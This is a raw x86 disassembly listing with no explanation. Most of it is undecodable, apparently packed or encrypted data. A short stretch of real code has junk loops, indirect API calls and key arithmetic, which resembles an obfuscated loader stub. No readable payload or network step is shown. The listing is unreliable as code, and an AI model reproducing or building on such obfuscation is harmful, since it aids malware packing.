  40308e:	and    cl,0xf7
  403091:	jl     0x4030c2
  403093:	inc    ebp
  403094:	push   ss
  403095:	xor    al,0xde
  403097:	or     ebx,ebp
  403099:	rcl    DWORD PTR [ebx+0x66d154f9],cl
  40309f:	xlat   BYTE PTR ds:[ebx]
  4030a0:	js     0x403089
  4030a2:	jo     0x4030cf
  4030a4:	xor    DWORD PTR [ebx+0xce74fda],0xffffffb8
  4030ab:	out    0xd6,al
  4030ad:	ret    
  4030ae:	jmp    0xa1b7:0x409fb6de
  4030b5:	mov    eax,0x735f9c63
  4030ba:	or     DWORD PTR [edx+eax*8-0x6c],edx
  4030be:	shr    DWORD PTR [ebp-0x76],cl
  4030c1:	or     DWORD PTR [eax+0x36e2d3ba],ebx
  4030c7:	mov    ds:0xaa93cdc3,al
  4030cc:	aaa    
  4030cd:	xchg   ebp,eax
  4030ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030cf:	adc    DWORD PTR [eax-0x62e14766],edx
  4030d5:	dec    ebp
  4030d6:	mov    DWORD PTR [ebx+0x3c0bbe71],edi
  4030dc:	xchg   esi,eax
  4030dd:	jne    0x4030dd
  4030df:	rcl    edx,0xc9
  4030e2:	sub    DWORD PTR [ebp+0x708308cd],ecx
  4030e8:	lods   eax,DWORD PTR ds:[esi]
  4030e9:	xchg   ebp,eax
  4030ea:	xchg   ecx,eax
  4030eb:	sub    esi,DWORD PTR [edi]
  4030ed:	sbb    eax,DWORD PTR [ebp+0x55fd23cd]
  4030f3:	mul    DWORD PTR [edx+0x74]
  4030f6:	sar    DWORD PTR [ebp-0x743acec7],1
  4030fc:	(bad)  
  4030fd:	pushf  
  4030fe:	and    al,BYTE PTR [ebp+0x10]
  403101:	das    
  403102:	inc    edx
  403103:	(bad)  
  403104:	mov    gs,WORD PTR [edi-0x3e]
  403107:	(bad)  
  403108:	mov    DWORD PTR ds:0xf505dc56,edi
  40310e:	and    BYTE PTR [ecx-0x1b17a5d5],dh
  403114:	dec    edx
  403115:	call   0x25cf:0xc4fa60fe
  40311c:	mov    al,ds:0xaaa55120
  403121:	call   0x4152:0xbb509a16
  403128:	pop    edx
  403129:	or     al,0xad
  40312b:	loopne 0x403177
  40312d:	and    al,0x66
  40312f:	and    edi,esp
  403131:	jae    0x4030cc
  403133:	ins    BYTE PTR es:[edi],dx
  403134:	mov    BYTE PTR [ecx-0x135fec9d],0xd
  40313b:	xchg   esp,eax
  40313c:	inc    DWORD PTR [ebp+eax*4+0x35a6206]
  403143:	mov    DWORD PTR [eax+ebp*8],ebx
  403146:	mov    edi,0x5835b896
  40314b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40314c:	fild   QWORD PTR [ebx]
  40314e:	aaa    
  40314f:	mov    ecx,0xac79c2eb
  403154:	and    eax,0x3ad930a2
  403159:	add    BYTE PTR [esi],ah
  40315b:	ret    0x280b
  40315e:	gs push esp
  403160:	mov    bh,0xe9
  403162:	push   cs
  403163:	add    dl,BYTE PTR [eax-0x5]
  403166:	(bad)  
  403167:	das    
  403168:	cmp    al,0x0
  40316a:	pushf  
  40316b:	je     0x40318b
  40316d:	cld    
  40316e:	aas    
  40316f:	ret    0x672f
  403172:	cmovs  esp,edx
  403175:	push   ecx
  403176:	add    al,0x7
  403178:	push   es
  403179:	mov    si,0x65a1
  40317d:	cmp    ebp,DWORD PTR [ebx+0x7b15e9ab]
  403183:	xor    al,0x0
  403185:	xchg   ebp,eax
  403186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403187:	(bad)  
  403188:	test   BYTE PTR [edi-0x3c],cl
  40318b:	adc    al,0xc7
  40318d:	mov    bl,0x89
  40318f:	or     eax,0x999a5a62
  403194:	inc    esi
  403195:	enter  0xf513,0x4
  403199:	add    al,0xa
  40319b:	inc    ebx
  40319c:	sub    ecx,esp
  40319e:	ret    
  40319f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031a0:	add    al,0x95
  4031a2:	push   ebp
  4031a3:	pop    esi
  4031a4:	dec    eax
  4031a5:	(bad)  
  4031a6:	mov    edx,0xe71f515d
  4031ab:	or     eax,0x52275e2f
  4031b0:	push   0xc11de99d
  4031b5:	out    0xa,eax
  4031b7:	dec    ecx
  4031b8:	push   ebx
  4031b9:	xor    BYTE PTR [edx-0x3dce3f1d],bl
  4031bf:	inc    esp
  4031c0:	pop    edx
  4031c1:	fimul  DWORD PTR [edi+0x65593a38]
  4031c7:	or     al,0x30
  4031c9:	push   cs
  4031ca:	rcl    DWORD PTR [eax+edi*8],0x7e
  4031ce:	iret   
  4031cf:	ror    DWORD PTR [eax+0x23],1
  4031d2:	stos   DWORD PTR es:[edi],eax
  4031d3:	sbb    dh,BYTE PTR [edi-0xce24ccf]
  4031d9:	inc    esi
  4031da:	shl    DWORD PTR [edx-0x1],0x58
  4031de:	int3   
  4031df:	mov    al,ds:0xe205d1d7
  4031e4:	push   esp
  4031e5:	hlt    
  4031e6:	sahf   
  4031e7:	push   es
  4031e8:	inc    esp
  4031e9:	jge    0x4031f2
  4031eb:	mov    al,0xa
  4031ed:	loope  0x4031f2
  4031ef:	js     0x40320c
  4031f1:	and    eax,0xf849218e
  4031f6:	das    
  4031f7:	dec    esp
  4031f8:	clc    
  4031f9:	std    
  4031fa:	sub    al,0x85
  4031fc:	call   FWORD PTR [edi]
  4031fe:	lea    esi,gs:[edi+0x64]
  403202:	jbe    0x40318f
  403204:	retf   
  403205:	into   
  403206:	jecxz  0x4031f8
  403208:	xchg   esp,ebp
  40320a:	jp     0x40319d
  40320c:	sbb    al,dl
  40320e:	adc    esp,DWORD PTR ds:0x700eacd6
  403214:	lock mov ecx,0x1ad91f90
  40321b:	adc    BYTE PTR [ebp+ebx*1+0x684e42ff],cl
  403222:	and    DWORD PTR [esi-0x64f8ad89],esi
  403228:	lea    edi,[ecx+0x4fef89cf]
  40322e:	sbb    BYTE PTR [esi+0x5aef80a4],0x42
  403235:	and    al,ah
  403237:	sub    BYTE PTR [ebp+0x1c],bh
  40323a:	sahf   
  40323b:	inc    ebx
  40323c:	fidivr DWORD PTR [ecx]
  40323e:	cmp    edx,DWORD PTR [ebx]
  403240:	inc    eax
  403241:	loopne 0x403203
  403243:	pop    ebp
  403244:	out    0x79,al
  403246:	stos   DWORD PTR es:[edi],eax
  403247:	or     ebx,DWORD PTR [esi]
  403249:	pop    ds
  40324a:	in     al,dx
  40324b:	mov    ebp,0x952906bd
  403250:	pop    ds
  403251:	adc    eax,0x7c4ac506
  403256:	xchg   edi,eax
  403257:	fisttp QWORD PTR [esp+esi*4-0x2b]
  40325b:	or     al,0xbe
  40325d:	stc    
  40325e:	ja     0x403244
  403260:	(bad)  
  403261:	push   ebp
  403262:	mov    bl,0xd3
  403264:	pop    esi
  403265:	sub    edi,eax
  403267:	mov    ebp,DWORD PTR [ebx]
  403269:	ja     0x4032b7
  40326b:	push   esp
  40326c:	shr    DWORD PTR [ecx+edi*4+0x32],1
  403270:	out    dx,eax
  403271:	test   BYTE PTR [ebx+ebp*4],al
  403274:	gs pop edx
  403276:	mov    edx,0xd7c479e6
  40327b:	rol    DWORD PTR [eax],1
  40327d:	xchg   ebp,eax
  40327e:	mov    dl,0x10
  403280:	sbb    DWORD PTR [ebx-0x37],ebx
  403283:	ret    0xc
  403286:	push   ebp
  403287:	mov    ebp,esp
  403289:	sub    esp,0x14
  40328c:	leave  
  40328d:	ret    0x4
  403290:	push   ebp
  403291:	mov    ebp,esp
  403293:	push   ecx
  403294:	push   ecx
  403295:	neg    ecx
  403297:	mov    eax,0xf89c8535
  40329c:	and    DWORD PTR ds:0x433717,0x0
  4032a6:	mov    edx,DWORD PTR ds:0x433717
  4032ac:	inc    edx
  4032ad:	mov    DWORD PTR ds:0x433717,edx
  4032b3:	cmp    DWORD PTR ds:0x433717,0x6
  4032ba:	jne    0x4032d5
  4032c0:	push   0x8ffb
  4032c5:	push   0x6662
  4032ca:	push   0x4337ed
  4032cf:	call   DWORD PTR ds:0x412180
  4032d5:	cmp    DWORD PTR ds:0x433717,0x5
  4032dc:	jne    0x4032ef
  4032e2:	mov    edx,DWORD PTR ds:0x433717
  4032e8:	inc    edx
  4032e9:	mov    DWORD PTR ds:0x433717,edx
  4032ef:	cmp    DWORD PTR ds:0x433717,0x11
  4032f6:	jb     0x4032a6
  4032fc:	mov    DWORD PTR [ebp-0x8],eax
  4032ff:	sbb    DWORD PTR ds:0x43369b,edi
  403305:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40330c:	mov    DWORD PTR ds:0x43375b,0x7030
  403316:	mov    edx,DWORD PTR [ebp-0x8]
  403319:	and    DWORD PTR ds:0x4336f3,0x0
  403323:	xor    ecx,ecx
  403325:	or     ecx,DWORD PTR ds:0x4336f3
  40332b:	inc    ecx
  40332c:	mov    DWORD PTR ds:0x4336f3,ecx
  403332:	cmp    DWORD PTR ds:0x4336f3,0x1f
  403339:	jne    0x403361
  40333f:	push   0x433757
  403344:	push   0x433723
  403349:	push   DWORD PTR [ebp-0xc]
  40334c:	push   0x4338cc
  403351:	push   0x4337ca
  403356:	push   0x433867
  40335b:	call   DWORD PTR ds:0x412184
  403361:	cmp    DWORD PTR ds:0x4336f3,0x13
  403368:	jb     0x403323
  40336e:	mov    DWORD PTR ds:0x43365b,0x1f
  403378:	cmp    DWORD PTR ds:0x43365b,0x0
  40337f:	je     0x4033d1
  403385:	cmp    DWORD PTR ds:0x43365b,0x4
  40338c:	jne    0x40339d
  403392:	push   0x4336eb
  403397:	call   DWORD PTR ds:0x412188
  40339d:	cmp    DWORD PTR ds:0x43365b,0x5
  4033a4:	jne    0x4033b9
  4033aa:	xor    ecx,ecx
  4033ac:	xor    ecx,DWORD PTR ds:0x43365b
  4033b2:	dec    ecx
  4033b3:	mov    DWORD PTR ds:0x43365b,ecx
  4033b9:	mov    ecx,DWORD PTR ds:0x43365b
  4033bf:	dec    ecx
  4033c0:	mov    DWORD PTR ds:0x43365b,ecx
  4033c6:	jmp    0x403378
  4033cb:	and    DWORD PTR ds:0x4336e3,ecx
  4033d1:	push   esi
  4033d2:	mov    ecx,0x7510853
  4033d7:	xor    edx,ecx
  4033d9:	mov    esi,0x32729a
  4033de:	adc    DWORD PTR ds:0x43372b,0x4fea
  4033e8:	push   edi
  4033e9:	sub    DWORD PTR ds:0x4336db,0x417a
  4033f3:	mov    edi,DWORD PTR [ebp+0x10]
  4033f6:	add    edx,esi
  4033f8:	cmp    edi,edx
  4033fa:	je     0x403eaf
  403400:	jmp    0x40360c
  403405:	adc    DWORD PTR [edi+0x6fb6ef04],esp
  40340b:	icebp  
  40340c:	popa   
  40340d:	mov    WORD PTR [ebx],?
  40340f:	push   edi
  403410:	inc    esp
  403411:	fist   DWORD PTR [eax+0x131621c2]
  403417:	jl     0x403495
  403419:	ins    DWORD PTR es:[edi],dx
  40341a:	jg     0x403498
  40341c:	jl     0x403446
  40341e:	mov    DWORD PTR [esi+0x6a],ecx
  403421:	mov    cl,0xd5
  403423:	frstor [ebx+0x7c]
  403426:	in     eax,dx
  403427:	clc    
  403428:	clc    
  403429:	xchg   BYTE PTR [edx+0x20],ah
  40342c:	pushf  
  40342d:	stc    
  40342e:	pop    eax
  40342f:	xor    BYTE PTR [esi+0x65eda7c8],dl
  403435:	jecxz  0x403425
  403437:	not    al
  403439:	stc    
  40343a:	daa    
  40343b:	shl    BYTE PTR [esi-0x1e264569],0x91
  403442:	dec    edx
  403443:	jb     0x40344f
  403445:	inc    ecx
  403446:	xchg   esi,eax
  403447:	sub    al,0xe3
  403449:	mov    edx,DWORD PTR [eax+0x68df3b2b]
  40344f:	add    edx,eax
  403451:	cmp    bl,al
  403453:	fwait
  403454:	(bad)  
  403455:	std    
  403456:	adc    dh,BYTE PTR [eax+0x4829462d]
  40345c:	das    
  40345d:	or     eax,0xdd6c9192
  403462:	scas   al,BYTE PTR es:[edi]
  403463:	sub    eax,0xab7f9720
  403468:	pop    ecx
  403469:	and    eax,0x5bad106d
  40346e:	push   ecx
  40346f:	pop    ebx
  403470:	aam    0xe6
  403472:	and    eax,eax
  403474:	cmp    BYTE PTR [ebp-0x36],0x11
  403478:	pop    edi
  403479:	lea    ebp,[ebp+0x4]
  40347c:	cwde   
  40347d:	inc    edi
  40347e:	into   
  40347f:	xor    DWORD PTR [edi-0x692d812b],0xffffffb9
  403486:	scas   eax,DWORD PTR es:[edi]
  403487:	in     eax,dx
  403488:	push   0x14
  40348a:	fidivr WORD PTR [ecx-0x16]
  40348d:	dec    ecx
  40348e:	test   eax,0xdbebd816
  403493:	xor    BYTE PTR [eax+0x7c70f24b],dh
  403499:	sbb    eax,0x4d68d4a6
  40349e:	pop    esi
  40349f:	mov    al,0x6
  4034a1:	lods   eax,DWORD PTR ds:[esi]
  4034a2:	out    dx,al
  4034a3:	jecxz  0x403496
  4034a5:	mov    ebp,0xc325b7eb
  4034aa:	outs   dx,DWORD PTR ds:[esi]
  4034ab:	(bad)  
  4034ac:	into   
  4034ad:	std    
  4034ae:	data16 mov al,0x82
  4034b1:	stos   DWORD PTR es:[edi],eax
  4034b2:	mov    ch,0x46
  4034b4:	in     al,dx
  4034b5:	pop    edi
  4034b6:	jbe    0x403522
  4034b8:	(bad)  
  4034b9:	jp     0x403464
  4034bb:	adc    al,0x25
  4034bd:	adc    dl,BYTE PTR [edi-0x4cb6dc0a]
  4034c3:	cld    
  4034c4:	or     eax,0x8e340db9
  4034c9:	sbb    al,0x8f
  4034cb:	std    
  4034cc:	adc    al,0xfe
  4034ce:	icebp  
  4034cf:	les    ecx,FWORD PTR [esi+eax*2+0x67a03b7c]
  4034d6:	sbb    al,0x7b
  4034d8:	and    BYTE PTR [ebp+0x6efb00d0],bh
  4034de:	imul   esp,DWORD PTR [ebx+0x47],0x5f9e8ba3
  4034e5:	clc    
  4034e6:	inc    ecx
  4034e7:	cmp    BYTE PTR [ebp-0x25e64054],dl
  4034ed:	inc    ebp
  4034ee:	mov    esp,0x20a062ee
  4034f3:	loop   0x4034cd
  4034f5:	dec    edi
  4034f6:	imul   ebx,ecx,0x6d
  4034f9:	popf   
  4034fa:	push   ecx
  4034fb:	inc    esi
  4034fc:	jmp    0x386:0x4c3c6cec
  403503:	add    ebx,DWORD PTR [edx+ecx*4+0x72584a30]
  40350a:	jmp    0x6e2d
  40350f:	sub    DWORD PTR [esi+0xa],ebp
  403512:	sar    BYTE PTR [esi-0x21],1
  403515:	xor    ebp,ebx
  403517:	and    DWORD PTR [ecx+0x16231e73],0x37
  40351e:	pop    edi
  40351f:	(bad)  
  403520:	mov    al,0x4a
  403522:	mov    esi,0xe1e762e5
  403527:	push   es
  403528:	or     ebp,esp
  40352a:	push   ebp
  40352b:	push   ebx
  40352c:	xchg   cl,al
  40352e:	mov    ebp,0x726a0ecf
  403533:	les    ebp,FWORD PTR [ebx-0x228a44da]
  403539:	jle    0x403502
  40353b:	not    DWORD PTR [edx+eax*4]
  40353e:	pop    esi
  40353f:	aas    
  403540:	sub    eax,0x7a4531e7
  403545:	sar    BYTE PTR [eax-0xc],1
  403548:	in     eax,dx
  403549:	xchg   edi,eax
  40354a:	mov    DWORD PTR [ecx-0x49],esi
  40354d:	push   ss
  40354e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40354f:	lock adc BYTE PTR [edx+0x11],dl
  403553:	call   0xe740:0xcd8d4f70
  40355a:	add    al,0x96
  40355c:	lods   eax,DWORD PTR ds:[esi]
  40355d:	inc    ecx
  40355e:	dec    ebx
  40355f:	mov    ds:0x13a13ab,al
  403564:	mov    ebp,cs
  403566:	cmp    DWORD PTR [ecx-0xf2ec74f],0x1e313d1b
  403570:	mov    eax,edi
  403572:	inc    eax
  403573:	mov    eax,ds:0x8da80029
  403578:	out    0xc4,al
  40357a:	test   al,0xe9
  40357c:	rcl    BYTE PTR [ecx+edx*8+0x5f],1
  403580:	adc    eax,DWORD PTR [edi+0x39]
  403583:	dec    esi
  403584:	nop
  403585:	pusha  
  403586:	ins    BYTE PTR es:[edi],dx
  403587:	jbe    0x4035cb
  403589:	into   
  40358a:	inc    ebx
  40358b:	imul   BYTE PTR [ebx-0x3a]
  40358e:	ret    
  40358f:	(bad)  
  403590:	idiv   DWORD PTR [edi+0x7]
  403593:	mov    edi,0x1f936d7e
  403598:	pop    edx
  403599:	add    DWORD PTR ds:0x224bb34a,edi
  40359f:	jl     0x40360d
  4035a1:	xchg   ebp,eax
  4035a2:	cmp    eax,0x13a03214
  4035a7:	stos   DWORD PTR es:[edi],eax
  4035a8:	test   BYTE PTR [esi+ebx*8],cl
  4035ab:	ins    BYTE PTR es:[edi],dx
  4035ac:	mov    dh,0xb9
  4035ae:	mov    DWORD PTR [esp+ebp*1+0x7],esi
  4035b2:	mov    ecx,0xa5696b97
  4035b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035b8:	imul   esi,DWORD PTR [ebp-0x6164ea2a],0xdc388e5b
  4035c2:	jle    0x403553
  4035c4:	aas    
  4035c5:	mov    edi,0xce01d04f
  4035ca:	inc    edi
  4035cb:	leave  
  4035cc:	jns    0x4035a5
  4035ce:	mov    ebp,0xa58382c
  4035d3:	inc    eax
  4035d4:	add    edx,DWORD PTR [edi]
  4035d6:	jmp    0xe183f768
  4035db:	xchg   edi,eax
  4035dc:	je     0x4035cf
  4035de:	call   0xb740a9c6
  4035e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035e4:	out    0x82,al
  4035e6:	stos   DWORD PTR es:[edi],eax
  4035e7:	adc    eax,0x7f62ba48
  4035ec:	push   esi
  4035ed:	cmp    eax,0x8777fee2
  4035f2:	popa   
  4035f3:	adc    eax,0xf213242
  4035f8:	sahf   
  4035f9:	jg     0x403609
  4035fb:	fild   QWORD PTR [eax]
  4035fd:	add    ah,0x56
  403600:	lods   eax,DWORD PTR ds:[esi]
  403601:	mov    ds:0xedc2c420,eax
  403606:	cs lahf 
  403608:	outs   dx,DWORD PTR ds:[esi]
  403609:	aas    
  40360a:	cmp    dl,cl
  40360c:	mov    edx,DWORD PTR [ebp-0x8]
  40360f:	mov    eax,DWORD PTR [ebp-0x4]
  403612:	xor    eax,ecx
  403614:	mov    edi,0xffcd8d66
  403619:	sub    edi,eax
  40361b:	add    edi,DWORD PTR [ebp+0x10]
  40361e:	xor    edx,ecx
  403620:	add    edx,esi
  403622:	cmp    edx,edi
  403624:	ja     0x403eaa
  40362a:	push   ebx
  40362b:	jmp    0x403841
  403630:	mov    esi,0x32729a
  403635:	jmp    0x403841
  40363a:	sbb    dh,BYTE PTR [eax+ebx*8+0x727272b6]
  403641:	mov    al,0x9c
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	call   0x52b4eb76
  403649:	out    0x7,eax
  40364b:	sbb    eax,0x7f6d7c7c
  403650:	jl     0x4036ce
  403652:	jns    0x403662
  403654:	inc    ebp
  403655:	clc    
  403656:	adc    BYTE PTR [esi],bh
  403658:	ret    
  403659:	push   0x34d1a456
  40365e:	call   DWORD PTR [edx+0x401d1e5d]
  403664:	inc    eax
  403665:	nop
  403666:	fcomp  DWORD PTR fs:[eax]
  403669:	outs   dx,DWORD PTR ds:[esi]
  40366a:	in     al,0x61
  40366c:	adc    al,0xfc
  40366e:	rcpps  xmm4,XMMWORD PTR [edi-0x8]
  403672:	dec    esp
  403673:	into   
  403674:	test   eax,0xb4688a74
  403679:	jnp    0x403683
  40367b:	mov    bl,0x15
  40367d:	pop    ds
  40367e:	out    dx,eax
  40367f:	mov    BYTE PTR [edi-0x75d0c514],dh
  403685:	bswap  ebp
  403687:	div    BYTE PTR [esi-0x1390be83]
  40368d:	push   ecx
  40368e:	pusha  
  40368f:	xor    cl,bl
  403691:	retf   0x4d42
  403694:	sbb    bh,BYTE PTR [edx-0x3e]
  403697:	repz xchg edi,eax
  403699:	cmp    BYTE PTR [eax],bl
  40369b:	xor    al,0x9d
  40369d:	(bad)  
  40369e:	sbb    cl,al
  4036a0:	int3   
  4036a1:	enter  0x603,0x5f
  4036a5:	pop    ebx
  4036a6:	push   0xffffff8e
  4036a8:	push   eax
  4036a9:	sub    DWORD PTR ds:0xa141259c,esp
  4036af:	jl     0x4036cf
  4036b1:	stc    
  4036b2:	call   0x33cdffc9
  4036b7:	mov    cl,0xab
  4036b9:	push   cs
  4036ba:	push   ss
  4036bb:	or     edx,esp
  4036bd:	xor    eax,0xba0950f6
  4036c2:	mov    BYTE PTR [ebx+esi*2],cl
  4036c5:	xchg   DWORD PTR [ecx+ecx*4+0x4e3e8760],ebx
  4036cc:	pop    ebx
  4036cd:	lods   al,BYTE PTR ds:[esi]
  4036ce:	(bad)  
  4036cf:	in     eax,dx
  4036d0:	mov    edx,0x2b837fef
  4036d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036d6:	or     eax,0x37781778
  4036db:	call   0x917e:0xe5b6f078
  4036e2:	hlt    
  4036e3:	lds    esp,FWORD PTR [edx-0x6e]
  4036e6:	dec    ebp
  4036e7:	mov    dl,ch
  4036e9:	pop    ecx
  4036ea:	add    BYTE PTR gs:[ecx-0x7e],dh
  4036ee:	xchg   edi,eax
  4036ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036f0:	cmp    eax,0x98a3519
  4036f5:	repz sbb al,0x71
  4036f8:	jmp    0x1109:0x9f371d2
  4036ff:	rcr    ebp,cl
  403701:	cld    
  403702:	dec    eax
  403703:	cmp    al,0x3
  403705:	stos   DWORD PTR es:[edi],eax
  403706:	(bad)  
  403707:	int    0x16
  403709:	ja     0x4036da
  40370b:	and    bl,BYTE PTR [ecx+0x75d4daf6]
  403711:	cmp    eax,0x8ca2f6c6
  403716:	inc    ebp
  403717:	test   al,0x9f
  403719:	jle    0x403703
  40371b:	(bad)  [ebx-0x27cf56e9]
  403721:	inc    edx
  403722:	sbb    esi,DWORD PTR [edx+0x4c36ed56]
  403728:	test   al,0x94
  40372a:	xor    al,0x6c
  40372c:	xchg   ebp,eax
  40372d:	je     0x4036b4
  40372f:	mov    cl,0xaa
  403731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403732:	mov    dh,0x99
  403734:	and    ch,al
  403736:	pop    eax
  403737:	xchg   ecx,eax
  403738:	mov    BYTE PTR [ecx],ah
  40373a:	ror    BYTE PTR [ebx+0x3e14aeb3],cl
  403740:	xchg   BYTE PTR [edi+0x38],bh
  403743:	jle    0x4036e1
  403745:	ins    DWORD PTR es:[edi],dx
  403746:	nop
  403747:	pop    esi
  403748:	and    ebp,DWORD PTR [edx-0x53]
  40374b:	pop    edi
  40374c:	int    0x3e
  40374e:	xor    al,0x28
  403750:	in     al,0xbb
  403752:	inc    edi
  403753:	push   eax
  403754:	xor    dh,BYTE PTR ss:[edx]
  403757:	mov    dl,0xf5
  403759:	stos   BYTE PTR es:[edi],al
  40375a:	shr    DWORD PTR [eax],0x50
  40375d:	xor    eax,0x98aac192
  403762:	std    
  403763:	xor    DWORD PTR [edx],0x2a
  403766:	je     0x403775
  403768:	icebp  
  403769:	mov    WORD PTR [ebx-0x3d],es
  40376c:	jle    0x4037b6
  40376e:	mov    esi,0x9e9811c0
  403773:	mov    BYTE PTR [ecx-0x5afcc481],ah
  403779:	ss fwait
  40377b:	les    eax,FWORD PTR [esp+eax*4]
  40377e:	cli    
  40377f:	inc    eax
  403780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403781:	scas   eax,DWORD PTR es:[edi]
  403782:	fisttp DWORD PTR [edi+0x5694b76]
  403788:	imul   ecx,DWORD PTR [edi-0x72],0xa1726cbb
  40378f:	cmc    
  403790:	jo     0x4037ac
  403792:	sahf   
  403793:	nop
  403794:	mov    eax,ds:0xb2866b05
  403799:	call   0x3360aedc
  40379e:	mov    al,ds:0xf2b1dbd
  4037a3:	lds    edi,FWORD PTR [ebx]
  4037a5:	push   0xffffffda
  4037a7:	or     DWORD PTR [ebx-0x50372419],esp
  4037ad:	adc    bh,BYTE PTR [ebx-0x65821db6]
  4037b3:	repnz mov bh,BYTE PTR [eax+esi*2+0x30563c4e]
  4037bb:	add    eax,0x9957010
  4037c0:	adc    BYTE PTR [eax],dl
  4037c2:	ret    
  4037c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037c4:	mov    dl,0xc8
  4037c6:	cmp    eax,0x4c568c6a
  4037cb:	nop    DWORD PTR [edi+eiz*1+0x39]
  4037d0:	pusha  
  4037d1:	gs sub cl,dl
  4037d4:	out    dx,al
  4037d5:	int3   
  4037d6:	jb     0x4037a8
  4037d8:	pop    ss
  4037d9:	pop    esp
  4037da:	push   ds
  4037db:	out    dx,al
  4037dc:	inc    eax
  4037dd:	mov    cr7,eax
  4037e0:	cmp    bl,BYTE PTR [edx]
  4037e2:	mov    edx,0xa5cee6b
  4037e7:	ret    0x1226
  4037ea:	mov    ds:0xcd48e43c,al
  4037ef:	sbb    edx,edi
  4037f1:	in     al,dx
  4037f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037f3:	push   eax
  4037f4:	dec    eax
  4037f5:	dec    edi
  4037f6:	xor    BYTE PTR ds:0x705f42d2,dl
  4037fc:	mov    ds:0xa6f0d009,eax
  403801:	adc    eax,0xa0cd024c
  403806:	lods   al,BYTE PTR ds:[esi]
  403807:	add    al,BYTE PTR [ecx]
  403809:	mov    dl,0xad
  40380b:	pop    esi
  40380c:	lods   al,BYTE PTR ds:[esi]
  40380d:	(bad)  
  40380e:	aad    0xca
  403810:	and    DWORD PTR [edi+0x2dcdd190],edi
  403816:	shl    DWORD PTR [eax-0x517451cf],0x6d
  40381d:	pusha  
  40381e:	xor    al,0x21
  403820:	inc    ecx
  403821:	and    esp,DWORD PTR [edx]
  403823:	lods   al,BYTE PTR ds:[esi]
  403824:	mov    ds:0x2407cb54,al
  403829:	dec    edi
  40382a:	mov    WORD PTR [bx],gs
  40382d:	mov    ah,0xfb
  40382f:	mov    dh,0xfe
  403831:	scas   eax,DWORD PTR es:[edi]
  403832:	dec    eax
  403833:	popf   
  403834:	mov    DWORD PTR [esi+esi*8+0x3e],ecx
  403838:	(bad)  
  40383a:	imul   ecx,esp,0xffffff9b
  40383d:	mov    dl,0x5c
  40383f:	call   0x7e9:0xf8458bd5
  403846:	add    al,BYTE PTR [eax]
  403848:	add    al,dl
  40384a:	mov    esi,0x5d5dd03b
  40384f:	sar    DWORD PTR [esi+0x4bfdbe82],cl
  403855:	hlt    
  403856:	add    al,0x52
  403858:	sahf   
  403859:	je     0x403877
  40385b:	jl     0x4038d9
  40385d:	ins    DWORD PTR es:[edi],dx
  40385e:	jg     0x4038dc
  403860:	jl     0x4038da
  403862:	add    al,0x5b
  403864:	(bad)  
  403866:	(bad)  
  403867:	cmp    BYTE PTR [ebp-0x5f],dh
  40386a:	add    ch,BYTE PTR [edx-0x7d]
  40386d:	js     0x40386a
  40386f:	sbb    BYTE PTR [ebx-0x5a73ce02],al
  403875:	bound  ecx,QWORD PTR [ecx]
  403877:	sbb    al,0x45
  403879:	cmc    
  40387a:	dec    edx
  40387b:	and    eax,DWORD PTR ss:[edi]
  40387e:	push   esi
  40387f:	sar    DWORD PTR [ecx],0x1a
  403882:	adc    bh,bh
  403884:	test   eax,0xee84f0b7
  403889:	repnz sbb esi,0x1d
  40388d:	sbb    bl,BYTE PTR [edx-0x78116536]
  403893:	fisub  WORD PTR [ebx-0x1c]
  403896:	jo     0x40382d
  403898:	rol    BYTE PTR [ebx-0x21],cl
  40389b:	pop    di
  40389d:	cmp    al,0x74
  40389f:	inc    esi
  4038a0:	sub    dh,dl
  4038a2:	adc    BYTE PTR [esi+0x25],dh
  4038a5:	das    
  4038a6:	sbb    al,0x6
  4038a8:	lea    ecx,[esi-0x10858dba]
  4038ae:	fnstenv [esi-0x71fc1e71]
  4038b4:	mov    esp,0xf292fefc
  4038b9:	mov    bl,0x17
  4038bb:	sub    BYTE PTR [edi-0x1a],0xbb
  4038bf:	jno    0x40392d
  4038c1:	cli    
  4038c2:	add    bh,BYTE PTR [ecx-0x65ee146e]
  4038c8:	adc    ah,dh
  4038ca:	test   DWORD PTR [eax],0xdd8eb53a
  4038d0:	out    0x4d,eax
  4038d2:	jmp    0x4038f3
  4038d4:	xor    al,0x17
  4038d6:	jae    0x4038d6
  4038d8:	out    dx,eax
  4038d9:	jno    0x403904
  4038db:	xchg   DWORD PTR [ecx+ecx*2-0x70],esi
  4038df:	sub    eax,0x2d4886c6
  4038e4:	scas   eax,DWORD PTR es:[edi]
  4038e5:	push   ds
  4038e6:	sub    BYTE PTR [edi+ebp*2],dh
  4038e9:	xchg   esp,eax
  4038ea:	mov    DWORD PTR [esi],0x3a770da3
  4038f0:	adc    ebp,ebp
  4038f2:	stos   BYTE PTR es:[edi],al
  4038f3:	inc    esp
  4038f4:	les    di,DWORD PTR [eax+0x385db9b]
  4038fb:	ins    DWORD PTR es:[edi],dx
  4038fc:	pushf  
  4038fd:	out    dx,al
  4038fe:	mov    BYTE PTR [esi+ecx*8],0x9b
  403902:	lock mov al,0x1b
  403905:	(bad)  
  403907:	jae    0x4038b0
  403909:	lds    eax,FWORD PTR ds:0xab84b602
  40390f:	repz jns 0x4038c7
  403912:	xchg   edi,eax
  403913:	hlt    
  403914:	push   edi
  403915:	dec    esp
  403916:	adc    al,0xd8
  403918:	mov    BYTE PTR [ebx],bh
  40391a:	test   DWORD PTR [edi+0x57],0x85882579
  403921:	push   esi
  403922:	test   eax,0x7071d99b
  403927:	xor    BYTE PTR [ebp-0x6],bl
  40392a:	jmp    0x4038d7
  40392c:	sbb    ah,BYTE PTR [ecx]
  40392e:	scas   eax,DWORD PTR es:[edi]
  40392f:	cdq    
